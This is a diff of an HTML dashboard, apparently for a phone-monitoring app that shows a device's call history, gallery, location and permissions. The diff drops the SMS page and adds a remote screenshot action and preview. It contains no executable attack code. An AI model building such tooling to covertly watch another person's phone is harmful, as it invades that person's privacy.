@@ -32,10 +32,6 @@
                     <i class="fas fa-phone"></i>
                     <span>Call History</span>
                 </li>
-                <li class="nav-item" data-page="sms">
-                    <i class="fas fa-sms"></i>
-                    <span>SMS Messages</span>
-                </li>
                 <li class="nav-item" data-page="gallery">
                     <i class="fas fa-images"></i>
                     <span>Gallery</span>
@@ -172,6 +168,10 @@
                             <i class="fas fa-location-arrow"></i>
                             <span>View Location</span>
                         </button>
+                        <button class="action-card" id="btnScreenshot">
+                            <i class="fas fa-camera-retro"></i>
+                            <span>Screenshot</span>
+                        </button>
                     </div>
                 </div>
 
@@ -199,6 +199,19 @@
                             <i class="fas fa-sync"></i>
                             <span>Sync Now</span>
                         </button>
+                    </div>
+                </div>
+
+                <!-- Screenshot Preview -->
+                <div class="section hidden" id="screenshotSection">
+                    <div class="section-header">
+                        <h3>Latest Screenshot</h3>
+                        <button class="btn-secondary btn-small" id="btnRefreshScreenshot">
+                            <i class="fas fa-sync"></i> Refresh
+                        </button>
+                    </div>
+                    <div class="screenshot-preview" id="screenshotPreview">
+                        <p class="empty-state">No screenshot available</p>
                     </div>
                 </div>
 
@@ -261,36 +274,6 @@
                 <div class="calls-list" id="callsList">
                     <p class="empty-state">No call logs found</p>
                 </div>
-            </div>
-
-            <!-- SMS Messages Page -->
-            <div class="page hidden" id="smsPage">
-                <div class="page-header">
-                    <h1>SMS Messages</h1>
-                    <div class="filter-chips">
-                        <button class="chip active" data-sms-filter="all">All</button>
-                        <button class="chip" data-sms-filter="inbox">Inbox</button>
-                        <button class="chip" data-sms-filter="sent">Sent</button>
-                    </div>
-                </div>
-                <div class="sms-stats">
-                    <div class="stat-card">
-                        <span class="stat-value" id="totalSms">0</span>
-                        <span class="stat-label">Total</span>
-                    </div>
-                    <div class="stat-card incoming">
-                        <span class="stat-value" id="inboxSms">0</span>
-                        <span class="stat-label">Inbox</span>
-                    </div>
-                    <div class="stat-card outgoing">
-                        <span class="stat-value" id="sentSms">0</span>
-                        <span class="stat-label">Sent</span>
-                    </div>
-                </div>
-                <div class="sms-list" id="smsList">
-                    <p class="empty-state">No SMS messages found</p>
-                </div>
-                <button class="btn-load-more hidden" id="loadMoreSms">Load More</button>
             </div>
 
             <!-- Location Page -->
@@ -494,12 +477,6 @@
                             <span>Storage</span>
                             <span class="permission-status pending">Unknown</span>
                             <button class="btn-request-perm" onclick="requestPermission('storage')" title="Request Permission"><i class="fas fa-plus-circle"></i></button>
-                        </div>
-                        <div class="permission-item" data-permission="sms">
-                            <i class="fas fa-sms"></i>
-                            <span>SMS</span>
-                            <span class="permission-status pending">Unknown</span>
-                            <button class="btn-request-perm" onclick="requestPermission('sms')" title="Request Permission"><i class="fas fa-plus-circle"></i></button>
                         </div>
                         <div class="permission-item" data-permission="contacts">
                             <i class="fas fa-address-book"></i>
